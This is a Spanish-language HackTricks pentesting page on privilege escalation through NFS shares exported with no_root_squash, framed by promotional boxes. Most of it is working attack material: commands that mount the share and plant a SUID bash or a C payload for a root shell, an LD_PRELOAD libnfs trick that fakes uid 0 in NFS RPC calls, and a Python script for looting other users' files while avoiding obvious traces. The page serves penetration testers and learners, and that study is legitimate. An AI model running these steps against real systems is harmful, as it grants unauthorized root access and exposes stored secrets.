<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) en github.

</details>


Lee el archivo _ **/etc/exports** _, si encuentras algún directorio configurado como **no\_root\_squash**, entonces puedes **acceder** a él **como cliente** y **escribir dentro** de ese directorio **como** si fueras el **root** local de la máquina.

**no\_root\_squash**: Esta opción básicamente otorga autoridad al usuario root en el cliente para acceder a los archivos en el servidor NFS como root. Y esto puede llevar a serias implicaciones de seguridad.

**no\_all\_squash:** Es similar a la opción **no\_root\_squash** pero se aplica a **usuarios no root**. Imagina que tienes una shell como usuario nobody; revisaste el archivo /etc/exports; la opción no\_all\_squash está presente; revisa el archivo /etc/passwd; emula un usuario no root; crea un archivo suid como ese usuario (montándolo usando nfs). Ejecuta el suid como usuario nobody y conviértete en otro usuario.

# Escalada de Privilegios

## Explotación Remota

Si has encontrado esta vulnerabilidad, puedes explotarla:

* **Montando ese directorio** en una máquina cliente, y **como root copiando** dentro de la carpeta montada el binario **/bin/bash** y dándole derechos **SUID**, y **ejecutando desde la máquina víctima** ese binario bash.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
* **Montando ese directorio** en una máquina cliente y **como root copiando** dentro de la carpeta montada nuestro payload compilado que abusará del permiso SUID, darle derechos **SUID** y **ejecutar desde la máquina víctima** ese binario (puedes encontrar aquí algunos [payloads C SUID](payloads-to-execute.md#c)).
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Explotación Local

{% hint style="info" %}
Ten en cuenta que si puedes crear un **túnel desde tu máquina a la máquina víctima, aún puedes usar la versión Remota para explotar esta escalada de privilegios tunelizando los puertos requeridos**.\
El siguiente truco es en caso de que el archivo `/etc/exports` **indique una IP**. En este caso, **no podrás usar** de ninguna manera el **exploit remoto** y necesitarás **abusar de este truco**.\
Otro requisito necesario para que el exploit funcione es que **la exportación dentro de `/etc/export`** **debe estar utilizando la bandera `insecure`**.\
\--_No estoy seguro de que si `/etc/export` está indicando una dirección IP este truco funcionará_--
{% endhint %}

**Truco copiado de** [**https://www.errno.fr/nfs\_privesc.html**](https://www.errno.fr/nfs\_privesc.html)

Ahora, supongamos que el servidor de recursos compartidos aún ejecuta `no_root_squash` pero hay algo que nos impide montar el recurso compartido en nuestra máquina de pentesting. Esto ocurriría si el `/etc/exports` tiene una lista explícita de direcciones IP permitidas para montar el recurso compartido.

Listar los recursos compartidos ahora muestra que solo la máquina en la que estamos intentando privesc tiene permiso para montarlo:
```
[root@pentest]# showmount -e nfs-server
Export list for nfs-server:
/nfs_root   machine
```
Esto significa que estamos atascados explotando el recurso compartido montado en la máquina localmente desde un usuario sin privilegios. Pero resulta que hay otro exploit local menos conocido.

Este exploit se basa en un problema en la especificación de NFSv3 que establece que depende del cliente anunciar su uid/gid al acceder al recurso compartido. ¡Así que es posible falsificar el uid/gid forjando las llamadas RPC de NFS si el recurso ya está montado!

Aquí hay una [biblioteca que te permite hacer exactamente eso](https://github.com/sahlberg/libnfs).

### Compilando el ejemplo <a href="#compilando-el-ejemplo" id="compilando-el-ejemplo"></a>

Dependiendo de tu kernel, podrías necesitar adaptar el ejemplo. En mi caso tuve que comentar las llamadas al sistema fallocate.
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### Explotación utilizando la biblioteca <a href="#explotacion-utilizando-la-biblioteca" id="explotacion-utilizando-la-biblioteca"></a>

Utilicemos el exploit más simple:
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
Coloca nuestro exploit en el recurso compartido y hazlo suid root falseando nuestro uid en las llamadas RPC:
```
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
Todo lo que queda es lanzarlo:
```
[w3user@machine libnfs]$ /mnt/share/a.out
[root@machine libnfs]#
```
¡Ahí estamos, escalada de privilegios a root local!

## Bonus NFShell <a href="#bonus-nfshell" id="bonus-nfshell"></a>

Una vez obtenido el acceso root local en la máquina, quise saquear el recurso compartido NFS en busca de posibles secretos que me permitieran pivotar. Pero había muchos usuarios del recurso compartido, cada uno con su propio uid, que no podía leer a pesar de ser root debido a la incompatibilidad de uid. No quería dejar rastros obvios como un chown -R, así que creé un pequeño fragmento de código para establecer mi uid antes de ejecutar el comando de shell deseado:
```python
#!/usr/bin/env python
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Luego puedes ejecutar la mayoría de los comandos como lo harías normalmente, prefijándolos con el script:
```
[root@machine .tmp]# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
[root@machine .tmp]# ls -la ./mount/9.3_old/
ls: cannot open directory ./mount/9.3_old/: Permission denied
[root@machine .tmp]# ./nfsh.py ls --color -l ./mount/9.3_old/
drwxr-x---  2 1008 1009 1024 Apr  5  2017 bin
drwxr-x---  4 1008 1009 1024 Apr  5  2017 conf
drwx------ 15 1008 1009 1024 Apr  5  2017 data
drwxr-x---  2 1008 1009 1024 Apr  5  2017 install
```
<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
